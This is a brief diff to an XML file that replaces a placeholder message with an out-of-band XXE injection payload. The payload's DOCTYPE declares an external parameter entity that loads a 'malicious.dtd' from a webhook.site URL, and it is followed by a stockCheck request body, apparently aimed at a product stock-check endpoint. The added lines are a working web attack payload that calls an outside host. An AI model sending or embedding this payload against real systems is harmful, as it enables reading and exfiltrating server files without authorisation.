@@ -1,6 +1,3 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<root>
-  <message>
-    <text>he this is rex server who ever open it</text>
-  </message>
-</root>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://webhook.site/c56eb8fb-c218-4977-a0c5-373566eec2f6/malicious.dtd"> %xxe;]>
+<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
